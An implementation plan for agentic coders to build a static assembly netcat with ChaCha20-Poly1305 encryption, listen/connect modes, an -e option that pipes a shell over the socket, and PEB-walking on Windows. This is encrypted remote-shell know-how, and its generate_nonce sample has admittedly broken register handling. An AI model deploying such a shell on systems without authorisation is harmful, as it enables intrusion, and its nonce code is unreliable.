# Encrypted Static Netcat — Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a pure x86-64 NASM assembly encrypted netcat with ChaCha20-Poly1305 AEAD, supporting listen/connect modes and optional shell execution on both Linux and Windows.

**Architecture:** Two platform-specific codebases (Linux direct syscalls, Windows PEB-walking + Win32 APIs) sharing platform-agnostic ChaCha20-Poly1305 crypto macros via `%include`. Each platform compiles as a single compilation unit. Cross-compiled from Linux.

**Tech Stack:** NASM assembler, ld (Linux), x86_64-w64-mingw32-ld (Windows), Python 3 with `cryptography` library for test harness.

**Reference:** Design spec at `docs/superpowers/specs/2026-03-13-encrypted-netcat-design.md`. Vapor repo at `https://github.com/Real-Fruit-Snacks/Vapor` for crypto and PEB walking reference.

---

## Chunk 1: Project Scaffolding + Shared Crypto

### Task 1: Project scaffolding and build system

**Files:**
- Create: `Makefile`
- Create: `build.sh`
- Create: `shared/` (directory)
- Create: `linux/` (directory)
- Create: `windows/` (directory)
- Create: `build/` (directory)
- Create: `tests/` (directory)

- [ ] **Step 1: Create directory structure**

```bash
mkdir -p shared linux windows build tests
```

- [ ] **Step 2: Create Makefile**

Create `Makefile`:
```makefile
NASM = nasm
LD_LINUX = ld
LD_WIN = x86_64-w64-mingw32-ld

all: linux windows

linux: build/ncat

windows: build/ncat.exe

build/ncat: linux/main.asm shared/*.inc linux/*.asm
	$(NASM) -f elf64 -I shared/ -I linux/ -o build/ncat.o linux/main.asm
	$(LD_LINUX) -o build/ncat build/ncat.o --strip-all
	@echo "[*] Linux binary: $$(wc -c < build/ncat) bytes"

build/ncat.exe: windows/main.asm shared/*.inc windows/*.asm
	$(NASM) -f win64 -I shared/ -I windows/ -o build/ncat.obj windows/main.asm
	$(LD_WIN) -o build/ncat.exe build/ncat.obj --strip-all
	@echo "[*] Windows binary: $$(wc -c < build/ncat.exe) bytes"

clean:
	rm -f build/*

.PHONY: all linux windows clean
```

- [ ] **Step 3: Create build.sh**

Create `build.sh`:
```bash
#!/bin/bash
set -e

KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
echo "[*] Generated PSK: $KEY"
echo ""

make all

echo ""
echo "[*] Build complete."
echo "[*] Usage (Linux):   ./build/ncat -l -p 4444 -k $KEY"
echo "[*] Usage (Windows): build\\ncat.exe -c <ip> -p 4444 -k $KEY"
```

```bash
chmod +x build.sh
```

- [ ] **Step 4: Create stub main.asm files so the project structure is testable**

Create `linux/main.asm`:
```nasm
; ncat - encrypted netcat (Linux x86-64)
; Stub for build system verification

section .text
global _start

_start:
    ; exit(0)
    mov eax, 60
    xor edi, edi
    syscall
```

Create `windows/main.asm`:
```nasm
; ncat - encrypted netcat (Windows x86-64)
; Stub for build system verification

section .text
global _start

_start:
    ; ExitProcess(0) - placeholder
    ret
```

- [ ] **Step 5: Verify Linux build compiles**

Run: `make linux`
Expected: `build/ncat` exists, file size reported, < 1KB stub

- [ ] **Step 6: Verify Linux stub runs**

Run: `./build/ncat; echo $?`
Expected: exits with 0

- [ ] **Step 7: Commit**

```bash
git init
git add Makefile build.sh linux/main.asm windows/main.asm .gitignore
git commit -m "feat: project scaffolding with build system and stub entry points"
```

Create `.gitignore`:
```
build/
*.o
*.obj
```

---

### Task 2: ChaCha20 shared macros

Port Vapor's ChaCha20 core into platform-agnostic NASM macros. These use only general-purpose register operations (add, xor, rotate) — no syscalls or API calls.

**Files:**
- Create: `shared/chacha20.inc`
- Create: `tests/test_chacha20.py`

**Reference:** Vapor's `vapor.asm` ChaCha20 implementation (quarter-round, double-rounds, block function). RFC 8439 Section 2.3 test vectors.

- [ ] **Step 1: Write the Python test harness for ChaCha20**

Create `tests/test_chacha20.py`. This test will:
1. Use RFC 8439 Section 2.3.2 test vector
2. Compile a small NASM test program that calls the ChaCha20 block function
3. Compare output against known-good values

```python
#!/usr/bin/env python3
"""Test ChaCha20 block function against RFC 8439 test vectors."""

import subprocess
import struct
import os
import sys

# RFC 8439 Section 2.3.2 Test Vector
# Key: 00:01:02:....:1f
TEST_KEY = bytes(range(32))
# Nonce: 00:00:00:09:00:00:00:4a:00:00:00:00
TEST_NONCE = bytes([0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x00])
# Block counter: 1
TEST_COUNTER = 1

# Expected output (first 64 bytes of keystream) from RFC 8439 Section 2.3.2
EXPECTED_STATE = [
    0xe4e7f110, 0x15593bd1, 0x1fdd0f50, 0xc47120a3,
    0xc7f4d1c7, 0x0368c033, 0x9aaa2204, 0x4e6cd4c3,
    0x466482d2, 0x09aa9f07, 0x05d7c214, 0xa2028bd9,
    0xd19c12b5, 0xb94e16de, 0xe883d0cb, 0x4e3c50a2,
]

def build_test_binary():
    """Build a small test binary that runs ChaCha20 and outputs the state."""
    test_asm = r"""
; ChaCha20 test harness
%include "chacha20.inc"

section .data
    ; RFC 8439 test key
    test_key: db 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07
              db 0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f
              db 0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17
              db 0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f
    ; RFC 8439 test nonce
    test_nonce: db 0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x4a
                db 0x00,0x00,0x00,0x00

section .bss
    output_state: resb 64

section .text
global _start

_start:
    ; Call chacha20_block(key, counter=1, nonce, output)
    lea rdi, [rel test_key]
    mov esi, 1                  ; counter
    lea rdx, [rel test_nonce]
    lea rcx, [rel output_state]
    call chacha20_block

    ; Write output_state to stdout (64 bytes)
    mov eax, 1                  ; sys_write
    mov edi, 1                  ; stdout
    lea rsi, [rel output_state]
    mov edx, 64
    syscall

    ; exit(0)
    mov eax, 60
    xor edi, edi
    syscall
"""
    os.makedirs("build", exist_ok=True)
    with open("build/test_chacha20.asm", "w") as f:
        f.write(test_asm)

    # Assemble and link
    ret = subprocess.run(
        ["nasm", "-f", "elf64", "-I", "shared/", "-o", "build/test_chacha20.o", "build/test_chacha20.asm"],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        print(f"NASM error:\n{ret.stderr}")
        return False

    ret = subprocess.run(
        ["ld", "-o", "build/test_chacha20", "build/test_chacha20.o"],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        print(f"ld error:\n{ret.stderr}")
        return False

    return True


def run_test():
    """Run the test binary and compare output."""
    ret = subprocess.run(["./build/test_chacha20"], capture_output=True)
    if ret.returncode != 0:
        print(f"Test binary exited with code {ret.returncode}")
        return False

    output = ret.stdout
    if len(output) != 64:
        print(f"Expected 64 bytes output, got {len(output)}")
        return False

    # Parse output as 16 little-endian uint32
    actual_state = list(struct.unpack("<16I", output))

    passed = True
    for i, (expected, actual) in enumerate(zip(EXPECTED_STATE, actual_state)):
        if expected != actual:
            print(f"  FAIL word[{i}]: expected 0x{expected:08x}, got 0x{actual:08x}")
            passed = False

    return passed


if __name__ == "__main__":
    print("[*] Building ChaCha20 test binary...")
    if not build_test_binary():
        print("FAIL: Build failed")
        sys.exit(1)

    print("[*] Running RFC 8439 Section 2.3.2 test vector...")
    if run_test():
        print("PASS: ChaCha20 block function matches RFC 8439 test vector")
    else:
        print("FAIL: Output does not match expected state")
        sys.exit(1)
```

```bash
chmod +x tests/test_chacha20.py
```

- [ ] **Step 2: Run the test to verify it fails (no chacha20.inc yet)**

Run: `python3 tests/test_chacha20.py`
Expected: FAIL — NASM error, `chacha20.inc` not found

- [ ] **Step 3: Implement shared/chacha20.inc**

Create `shared/chacha20.inc`. Port from Vapor's ChaCha20 implementation. The macro file must provide:
- `chacha20_block` function: takes key (rdi), counter (esi), nonce (rdx), output buffer (rcx)
- Sets up the 16-word state matrix with constants, key, counter, nonce
- Runs 20 rounds (10 double-rounds of column + diagonal quarter-rounds)
- Adds original state back to working state
- Writes 64 bytes to output buffer

Key implementation notes from Vapor:
- Constants: `0x61707865, 0x3320646e, 0x79622d32, 0x6b206574` ("expand 32-byte k")
- Quarter-round operates on 4 dwords: `a += b; d ^= a; d <<<= 16; c += d; b ^= c; b <<<= 12; a += b; d ^= a; d <<<= 8; c += d; b ^= c; b <<<= 7`
- State is 16 x 32-bit words, can use stack frame (64 bytes working + 64 bytes original)
- Column rounds: QR(0,4,8,12), QR(1,5,9,13), QR(2,6,10,14), QR(3,7,11,15)
- Diagonal rounds: QR(0,5,10,15), QR(1,6,11,12), QR(2,7,8,13), QR(3,4,9,14)

Also provide `chacha20_encrypt` function for XOR-ing plaintext with keystream:
- Takes key (rdi), counter (esi), nonce (rdx), plaintext (rcx), length (r8), output (r9)
- Generates keystream blocks and XORs with plaintext
- Handles partial final blocks

- [ ] **Step 4: Run the ChaCha20 test**

Run: `python3 tests/test_chacha20.py`
Expected: PASS — output matches RFC 8439 Section 2.3.2 test vector

- [ ] **Step 5: Commit**

```bash
git add shared/chacha20.inc tests/test_chacha20.py
git commit -m "feat: ChaCha20 block function with RFC 8439 test vector verification"
```

---

### Task 3: Poly1305 shared macros

Port Vapor's Poly1305 MAC into platform-agnostic NASM macros.

**Files:**
- Create: `shared/poly1305.inc`
- Create: `tests/test_poly1305.py`

**Reference:** Vapor's Poly1305 implementation. RFC 8439 Section 2.5.2 test vector.

- [ ] **Step 1: Write the Python test harness for Poly1305**

Create `tests/test_poly1305.py`. Use RFC 8439 Section 2.5.2 test vector:
- Key (r||s): `85:d6:be:78:57:55:6d:33:7f:44:52:fe:42:d5:06:a8:01:03:80:8a:fb:0d:b2:fd:4a:bf:f6:af:41:49:f5:1b`
- Message: "Cryptographic Forum Research Group"
- Expected tag: `a8:06:1d:c1:30:51:36:c6:c2:2b:8b:af:0c:01:27:a9`

Test structure same as ChaCha20: build a NASM test binary, run it, compare 16-byte tag output against expected.

The test binary should:
1. Load the 32-byte Poly1305 key
2. Load the message
3. Call `poly1305_mac(key, message, message_len, tag_output)`
4. Write the 16-byte tag to stdout
5. Exit

```bash
chmod +x tests/test_poly1305.py
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 tests/test_poly1305.py`
Expected: FAIL — `poly1305.inc` not found

- [ ] **Step 3: Implement shared/poly1305.inc**

Create `shared/poly1305.inc`. Port from Vapor's Poly1305 implementation. Must provide:
- `poly1305_mac` function: takes key (rdi, 32 bytes: r||s), message (rsi), message_len (rdx), tag_output (rcx)
- Clamp r (clear bits per RFC 8439 Section 2.5)
- Process message in 16-byte blocks
- Accumulate: `a = ((a + block) * r) mod (2^130 - 5)`
- Final: `tag = (a + s) mod 2^128`

Key implementation notes from Vapor:
- Uses 64-bit registers for 130-bit arithmetic with carry propagation
- Accumulator stored across multiple registers (e.g., r8, r9, r10 for 130+ bits)
- Multiplication requires handling 128-bit intermediate products
- Reduction mod 2^130-5 uses the property: `2^130 mod p = 5`, so multiply overflow by 5 and add back
- Clamping mask for r: clear bits 4,8,12,16 of each 32-bit half and top 2 bits

- [ ] **Step 4: Run the Poly1305 test**

Run: `python3 tests/test_poly1305.py`
Expected: PASS — tag matches RFC 8439 Section 2.5.2

- [ ] **Step 5: Commit**

```bash
git add shared/poly1305.inc tests/test_poly1305.py
git commit -m "feat: Poly1305 MAC with RFC 8439 test vector verification"
```

---

### Task 4: AEAD shared macros (ChaCha20-Poly1305 combined)

Combine ChaCha20 and Poly1305 into the full AEAD construction.

**Files:**
- Create: `shared/aead.inc`
- Create: `tests/test_aead.py`

**Reference:** RFC 8439 Section 2.8.2 AEAD test vector.

- [ ] **Step 1: Write the Python test harness for AEAD**

Create `tests/test_aead.py`. Two tests:

**Test A — Encrypt then verify with Python:**
1. Build NASM test binary that calls `aead_encrypt` with RFC 8439 Section 2.8.2 inputs
2. Capture ciphertext + tag output
3. Decrypt with Python `cryptography.hazmat.primitives.ciphers.aead.ChaCha20Poly1305` and verify plaintext matches

**Test B — Python encrypt, assembly decrypt:**
1. Encrypt a message with Python ChaCha20Poly1305
2. Feed ciphertext + tag to NASM test binary calling `aead_decrypt`
3. Verify decrypted plaintext matches original

RFC 8439 Section 2.8.2 test vector:
- Key: `1c 92 40 a5 eb 55 d3 8a f3 33 88 86 04 f6 b5 f0 47 39 17 c1 40 2b 80 09 9d ca 5c bc 20 70 75 c0`
- Nonce: `00 00 00 00 01 02 03 04 05 06 07 08`
- AAD: `f3 33 88 86 00 00 00 00 00 00 4e 91`
- Plaintext: "Internet-Engineering-Task-Force" (with specific hex from RFC)

```bash
chmod +x tests/test_aead.py
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 tests/test_aead.py`
Expected: FAIL — `aead.inc` not found

- [ ] **Step 3: Implement shared/aead.inc**

Create `shared/aead.inc`. Must `%include "chacha20.inc"` and `%include "poly1305.inc"`. Provides:

**`aead_encrypt`:** (key rdi, nonce rsi, plaintext rdx, pt_len rcx, aad r8, aad_len r9, output [stack])
1. Generate poly1305 one-time key: `chacha20_block(key, counter=0, nonce)`, take first 32 bytes
2. Encrypt plaintext: `chacha20_encrypt(key, counter=1, nonce, plaintext, pt_len, output+12)`
3. Copy nonce to output[0..12]
4. Construct Poly1305 input: `pad16(aad) || pad16(ciphertext) || le64(aad_len) || le64(ct_len)`
5. Compute tag: `poly1305_mac(otk, poly_input, poly_input_len, output+12+pt_len)`

**`aead_decrypt`:** (key rdi, nonce rsi, ciphertext rdx, ct_len rcx, aad r8, aad_len r9, tag r10, output [stack])
1. Generate poly1305 one-time key
2. Construct Poly1305 input from ciphertext
3. Compute expected tag
4. Constant-time compare with received tag (XOR all bytes, OR together, check zero)
5. If match: decrypt with `chacha20_encrypt` (XOR is symmetric)
6. If mismatch: return error code (rax = -1)

**Note:** For our wire protocol, AAD is empty (aad_len = 0), but implement the full AEAD construction for correctness and RFC compliance.

- [ ] **Step 4: Run the AEAD test**

Run: `python3 tests/test_aead.py`
Expected: PASS — both encrypt and decrypt match between assembly and Python

- [ ] **Step 5: Commit**

```bash
git add shared/aead.inc tests/test_aead.py
git commit -m "feat: ChaCha20-Poly1305 AEAD with RFC 8439 test vector and Python cross-validation"
```

---

## Chunk 2: Linux Implementation

### Task 5: Linux CLI argument parsing

**Files:**
- Modify: `linux/main.asm` (replace stub)
- Create: `tests/test_cli_linux.sh`

- [ ] **Step 1: Write the test script**

Create `tests/test_cli_linux.sh`:
```bash
#!/bin/bash
set -e
PASS=0
FAIL=0
NCAT=./build/ncat

# Test: no arguments should print usage and exit non-zero
output=$($NCAT 2>&1 || true)
if echo "$output" | grep -q "Usage"; then
    echo "PASS: no args prints usage"
    ((PASS++))
else
    echo "FAIL: no args should print usage"
    ((FAIL++))
fi

# Test: missing -k should error
output=$($NCAT -l -p 4444 2>&1 || true)
if echo "$output" | grep -qi "key"; then
    echo "PASS: missing -k prints error"
    ((PASS++))
else
    echo "FAIL: missing -k should print error"
    ((FAIL++))
fi

# Test: missing -p should error
output=$($NCAT -l -k aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 2>&1 || true)
if echo "$output" | grep -qi "port"; then
    echo "PASS: missing -p prints error"
    ((PASS++))
else
    echo "FAIL: missing -p should print error"
    ((FAIL++))
fi

# Test: -l and -c both set should error
output=$($NCAT -l -c 127.0.0.1 -p 4444 -k aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 2>&1 || true)
if echo "$output" | grep -qi "conflict\|both\|invalid"; then
    echo "PASS: -l and -c conflict detected"
    ((PASS++))
else
    echo "FAIL: should detect -l and -c conflict"
    ((FAIL++))
fi

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] || exit 1
```

```bash
chmod +x tests/test_cli_linux.sh
```

- [ ] **Step 2: Run test to verify it fails**

Run: `make linux && bash tests/test_cli_linux.sh`
Expected: FAIL — stub just exits, no usage output

- [ ] **Step 3: Implement CLI parsing in linux/main.asm**

Replace the stub in `linux/main.asm` with full entry point:

1. `_start` receives argc in `[rsp]`, argv at `[rsp+8]` (System V ABI for ELF entry)
2. Walk argv[1..argc-1], compare each against flags:
   - `-l`: set mode=1
   - `-c`: set mode=0, parse next arg as IPv4 (call `parse_ipv4` helper)
   - `-p`: parse next arg as decimal port number, convert to network byte order (`xchg al,ah` or `ror ax,8`)
   - `-k`: parse next arg as 64-char hex string into 32 bytes (call `parse_hex` helper)
   - `-e`: store pointer to next arg as exec_cmd
3. Validate: port must be set, key must be set, if neither -l nor -c then error
4. Store parsed state in `.bss` section:
   ```nasm
   section .bss
       g_mode:     resb 1      ; 0=connect, 1=listen
       g_host:     resd 1      ; IPv4 network order
       g_port:     resw 1      ; network byte order
       g_key:      resb 32     ; 256-bit PSK
       g_exec:     resq 1      ; pointer to -e command (0 if none)
       g_sockfd:   resq 1      ; connected socket fd
       g_child_pid: resq 1     ; child PID from fork (for kill/waitpid cleanup)
       g_shell_write_fd: resd 1 ; write fd to child's stdin pipe
   ```

**Key zeroing:** All exit paths must zero `g_key` before calling `exit(60)`. Add a `cleanup_and_exit` function:
```nasm
cleanup_and_exit:
    ; Zero the key in memory
    lea rdi, [rel g_key]
    xor eax, eax
    mov ecx, 32
    rep stosb
    ; Kill child process if spawned
    mov rdi, [g_child_pid]
    test rdi, rdi
    jz .no_child
    mov eax, 62                 ; sys_kill
    mov esi, 9                  ; SIGKILL
    syscall
    mov eax, 61                 ; sys_wait4
    mov rdi, [g_child_pid]
    xor esi, esi                ; status = NULL
    xor edx, edx               ; options = 0
    xor r10, r10                ; rusage = NULL
    syscall
.no_child:
    mov eax, 60                 ; sys_exit
    xor edi, edi
    syscall
```
All `exit(0)` calls in the relay loop and error paths should `jmp cleanup_and_exit` instead.
5. Error messages in `.rodata`:
   ```nasm
   section .rodata
       usage_msg: db "Usage: ncat [-l] [-c <host>] -p <port> -k <hex-key> [-e <cmd>]", 10, 0
       err_port:  db "Error: -p <port> is required", 10, 0
       err_key:   db "Error: -k <64-char-hex-key> is required", 10, 0
       err_conflict: db "Error: -l and -c cannot both be set", 10, 0
   ```

Helper functions needed:
- `parse_ipv4`: convert "A.B.C.D" string to 32-bit network-order dword
- `parse_port`: convert decimal string to 16-bit network-order word
- `parse_hex`: convert 64-char hex string to 32 bytes
- `print_stderr`: write null-terminated string to fd 2
- `strlen`: get length of null-terminated string

- [ ] **Step 4: Build and run CLI tests**

Run: `make linux && bash tests/test_cli_linux.sh`
Expected: All 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add linux/main.asm tests/test_cli_linux.sh
git commit -m "feat: Linux CLI argument parsing with validation"
```

---

### Task 6: Linux networking (connect + listen)

**Files:**
- Create: `linux/net.asm`
- Modify: `linux/main.asm` (add `%include` and call networking after parse)
- Create: `tests/test_net_linux.sh`

- [ ] **Step 1: Write the test script**

Create `tests/test_net_linux.sh`:
```bash
#!/bin/bash
set -e
KEY="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
NCAT=./build/ncat
PORT=18234

# Test: listen mode accepts a connection
echo "[*] Test: listen mode accepts TCP connection"
$NCAT -l -p $PORT -k $KEY &
NCAT_PID=$!
sleep 0.5

# Connect with plain netcat, send a byte
echo "hello" | nc -w 1 127.0.0.1 $PORT || true
sleep 0.2
kill $NCAT_PID 2>/dev/null || true
wait $NCAT_PID 2>/dev/null || true
echo "PASS: listen mode accepted connection (process ran)"

# Test: connect mode connects to a listener
echo "[*] Test: connect mode connects to TCP listener"
PORT2=18235
nc -l -p $PORT2 &
NC_PID=$!
sleep 0.5

timeout 2 $NCAT -c 127.0.0.1 -p $PORT2 -k $KEY || true
kill $NC_PID 2>/dev/null || true
wait $NC_PID 2>/dev/null || true
echo "PASS: connect mode attempted connection"

echo ""
echo "All network tests passed"
```

```bash
chmod +x tests/test_net_linux.sh
```

- [ ] **Step 2: Run test to verify it fails**

Run: `make linux && bash tests/test_net_linux.sh`
Expected: FAIL — no networking implemented, ncat exits immediately

- [ ] **Step 3: Implement linux/net.asm**

Create `linux/net.asm` with these functions:

```nasm
; net_listen: bind and accept one connection
; Input:  di = port (network byte order)
; Output: rax = connected socket fd (or -1 on error)
net_listen:
    ; socket(AF_INET, SOCK_STREAM, 0)
    ; bind(sockfd, &sockaddr_in, 16)
    ; listen(sockfd, 1)
    ; accept(sockfd, NULL, NULL)
    ; close(listen_fd)
    ; return accepted fd

; net_connect: connect to remote host
; Input:  edi = host (network byte order), si = port (network byte order)
; Output: rax = connected socket fd (or -1 on error)
net_connect:
    ; socket(AF_INET, SOCK_STREAM, 0)
    ; connect(sockfd, &sockaddr_in, 16)
    ; return sockfd

; send_all: send exactly n bytes
; Input:  edi = fd, rsi = buffer, rdx = length
; Output: rax = 0 on success, -1 on error
send_all:
    ; loop: write(fd, buf+sent, remaining)
    ; handle partial writes

; recv_exact: receive exactly n bytes
; Input:  edi = fd, rsi = buffer, rdx = length
; Output: rax = 0 on success, -1 on error (including EOF)
recv_exact:
    ; loop: read(fd, buf+received, remaining)
    ; handle partial reads, return -1 on 0 (EOF)
```

Build `sockaddr_in` on the stack for both functions:
```nasm
    sub rsp, 16
    mov word [rsp], 2          ; AF_INET
    mov word [rsp+2], si       ; port (already network order)
    mov dword [rsp+4], edi     ; addr (already network order)
    xor eax, eax
    mov qword [rsp+8], rax     ; padding
```

- [ ] **Step 4: Add %include and networking calls to linux/main.asm**

After CLI parsing, add:
```nasm
    %include "net.asm"

    ; After argument parsing:
    cmp byte [g_mode], 1
    je .listen_mode

.connect_mode:
    mov edi, [g_host]
    mov si, [g_port]
    call net_connect
    cmp rax, -1
    je .exit_error
    mov [g_sockfd], rax
    jmp .connected

.listen_mode:
    movzx edi, word [g_port]
    call net_listen
    cmp rax, -1
    je .exit_error
    mov [g_sockfd], rax

.connected:
    ; Socket fd now in g_sockfd — proceed to relay loop
    ; (placeholder: just exit for now)
    mov eax, 60
    xor edi, edi
    syscall
```

- [ ] **Step 5: Build and run network tests**

Run: `make linux && bash tests/test_net_linux.sh`
Expected: Both tests PASS — listen accepts connection, connect reaches listener

- [ ] **Step 6: Commit**

```bash
git add linux/net.asm linux/main.asm tests/test_net_linux.sh
git commit -m "feat: Linux networking - listen/connect/send_all/recv_exact"
```

---

### Task 7: Linux crypto wrappers (nonce generation)

**Files:**
- Create: `linux/crypto.asm`
- Create: `tests/test_crypto_linux.sh`

- [ ] **Step 1: Write the test**

Create `tests/test_crypto_linux.sh`:
```bash
#!/bin/bash
# Test that generate_nonce produces 12 non-zero bytes and two calls produce different values
# Build a small test binary that calls generate_nonce twice, outputs both to stdout
# Then compare them
```

Build a NASM test binary that:
1. Calls `generate_nonce` -> outputs 12 bytes to stdout
2. Calls `generate_nonce` -> outputs 12 bytes to stdout
3. Exits

The bash test reads 24 bytes, splits into two 12-byte halves, verifies they differ.

- [ ] **Step 2: Run test to verify it fails**

Run: `make linux && bash tests/test_crypto_linux.sh`
Expected: FAIL — no `generate_nonce` function

- [ ] **Step 3: Implement linux/crypto.asm**

Create `linux/crypto.asm`:

```nasm
; generate_nonce: fill buffer with 12 random bytes from /dev/urandom
; Input:  rdi = output buffer (12 bytes)
; Output: rax = 0 on success, -1 on error
generate_nonce:
    push rdi
    ; open("/dev/urandom", O_RDONLY)
    mov eax, 2                  ; sys_open
    lea rdi, [rel urandom_path]
    xor esi, esi                ; O_RDONLY
    syscall
    cmp rax, 0
    jl .nonce_error

    mov r8, rax                 ; save fd
    pop rdi                     ; restore output buffer

    ; read(fd, buf, 12)
    mov eax, 0                  ; sys_read
    mov edi, r8d                ; urandom fd
    mov rsi, rdi                ; output buffer (note: rdi was restored)
    ; Actually need to handle this more carefully with register usage
    mov edx, 12
    syscall

    ; close(fd)
    push rax
    mov eax, 3                  ; sys_close
    mov edi, r8d
    syscall
    pop rax

    cmp rax, 12
    jne .nonce_error
    xor eax, eax
    ret

.nonce_error:
    mov rax, -1
    ret

section .rodata
    urandom_path: db "/dev/urandom", 0
```

Also provide wrapper functions that combine AEAD with wire protocol framing:

```nasm
; encrypt_message: encrypt plaintext and prepend wire protocol header
; Input:  rdi = plaintext, esi = plaintext_len, rdx = output buffer
;         Key from g_key global
; Output: rax = total wire message length (4 + 12 + pt_len + 16)
;         Output format: [4B length][12B nonce][ciphertext][16B tag]

; decrypt_message: read wire protocol header, decrypt and verify
; Input:  rdi = wire message (starting after 4B length), esi = payload_len, rdx = output buffer
;         Key from g_key global
; Output: rax = plaintext length on success, -1 on MAC failure
```

- [ ] **Step 4: Run the test**

Run: `bash tests/test_crypto_linux.sh`
Expected: PASS — two different 12-byte nonces generated

- [ ] **Step 5: Commit**

```bash
git add linux/crypto.asm tests/test_crypto_linux.sh
git commit -m "feat: Linux crypto wrappers - nonce generation and wire protocol encrypt/decrypt"
```

---

### Task 8: Linux bidirectional relay loop

**Files:**
- Create: `linux/io.asm`
- Modify: `linux/main.asm` (wire up relay after connection)
- Create: `tests/test_relay_linux.py`

- [ ] **Step 1: Write the Python test harness**

Create `tests/test_relay_linux.py`:

This test:
1. Starts ncat in listen mode (no -e) with a known PSK
2. Connects to it with a Python socket
3. Python side: encrypts "hello" with ChaCha20-Poly1305 using the same PSK, sends wire-framed message
4. Reads response from Python's stdin→ncat→socket path (or in a simpler test, just verify the encrypted message arrives and can be decrypted)

Simpler initial test — verify echo through ncat:
1. Start ncat listener in background
2. Python connects, sends encrypted "ping"
3. On ncat's stdin (piped), type "pong"
4. Python reads and decrypts the response
5. Verify "pong" received

```bash
chmod +x tests/test_relay_linux.py
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 tests/test_relay_linux.py`
Expected: FAIL — no relay loop implemented

- [ ] **Step 3: Implement linux/io.asm**

Create `linux/io.asm`:

```nasm
; relay_loop: bidirectional encrypted relay
; Input:  edi = socket fd, esi = local_read_fd, edx = local_write_fd
;         In non-shell mode: local_read_fd=0 (stdin), local_write_fd=1 (stdout)
;         In shell mode: local_read_fd=child_stdout_pipe, local_write_fd=child_stdin_pipe
;         Reads key from g_key
; This function never returns normally — jumps to cleanup_and_exit

relay_loop:
    ; Allocate buffers on stack
    ; recv_buf:    65536 + 32 bytes (max encrypted message)
    ; send_buf:    65536 + 32 bytes
    ; plaintext:   65536 bytes
    ; pollfd:      16 bytes (2 x struct pollfd)

    ; Setup pollfd array:
    ;   [0] = { fd=socket_fd, events=POLLIN, revents=0 }
    ;   [1] = { fd=local_fd,  events=POLLIN, revents=0 }

.poll_loop:
    ; poll(pollfds, 2, -1)   ; block forever
    mov eax, 7               ; sys_poll
    ; ... setup args ...
    syscall

    ; Check socket_fd revents
    ; If POLLIN: read 4-byte length header, validate <= 65536
    ;            recv_exact the payload
    ;            call decrypt_message
    ;            if MAC fail: exit(1)
    ;            write plaintext to local_fd

    ; Check local_fd revents
    ; If POLLIN: read up to 65536 bytes
    ;            if 0 bytes: EOF, exit(0)
    ;            call encrypt_message
    ;            send_all the wire-framed ciphertext to socket_fd

    ; Check for POLLERR | POLLHUP on either fd
    ;   cleanup and exit(0)

    jmp .poll_loop
```

- [ ] **Step 4: Wire up relay in linux/main.asm**

After `.connected:`, replace the exit placeholder:
```nasm
.connected:
    mov edi, [g_sockfd]
    ; If no -e flag: local_fd is stdin (0) for reading, stdout (1) for writing
    ; With -e flag: local_fd is shell pipe (handled in Task 9)
    cmp qword [g_exec], 0
    jne .spawn_shell

    ; No -e: relay between socket and stdin/stdout
    mov esi, 0                  ; local_read_fd = stdin
    mov edx, 1                  ; local_write_fd = stdout
    call relay_loop
    ; relay_loop jumps to cleanup_and_exit, never returns

.spawn_shell:
    ; placeholder for Task 9
    jmp .exit_error
```

- [ ] **Step 5: Build and run relay test**

Run: `make linux && python3 tests/test_relay_linux.py`
Expected: PASS — encrypted message round-trips correctly between Python and ncat

- [ ] **Step 6: Commit**

```bash
git add linux/io.asm linux/main.asm tests/test_relay_linux.py
git commit -m "feat: Linux poll-based bidirectional encrypted relay loop"
```

---

### Task 9: Linux shell execution

**Files:**
- Create: `linux/shell.asm`
- Modify: `linux/main.asm` (wire up .spawn_shell)
- Create: `tests/test_shell_linux.py`

- [ ] **Step 1: Write the Python test**

Create `tests/test_shell_linux.py`:

This test:
1. Start ncat listener with `-e /bin/sh` and known PSK
2. Python connects, sends encrypted command: `echo hello_from_shell\n`
3. Python reads encrypted response
4. Decrypt and verify it contains "hello_from_shell"
5. Send encrypted `exit\n`
6. Verify ncat exits cleanly

```bash
chmod +x tests/test_shell_linux.py
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 tests/test_shell_linux.py`
Expected: FAIL — .spawn_shell jumps to exit_error

- [ ] **Step 3: Implement linux/shell.asm**

Create `linux/shell.asm`:

```nasm
; spawn_shell: fork, exec command, return pipe fds
; Input:  rdi = pointer to command string (null-terminated)
; Output: eax = read fd (child stdout), edx = write fd (child stdin)
;         Returns -1 in eax on error

spawn_shell:
    ; Create two pipes
    ;   stdin_pipe[0]=read, stdin_pipe[1]=write
    ;   stdout_pipe[0]=read, stdout_pipe[1]=write
    sub rsp, 32                 ; space for 2 pipes (4 ints = 16 bytes, aligned)

    ; pipe(stdin_pipe)
    mov eax, 22                 ; sys_pipe
    lea rdi, [rsp]
    syscall
    cmp rax, 0
    jl .shell_error

    ; pipe(stdout_pipe)
    mov eax, 22
    lea rdi, [rsp+8]
    syscall
    cmp rax, 0
    jl .shell_error

    ; fork()
    mov eax, 57
    syscall
    cmp rax, 0
    jl .shell_error
    je .child

.parent:
    ; Store child PID for cleanup (fork returned child pid in rax)
    mov [g_child_pid], rax

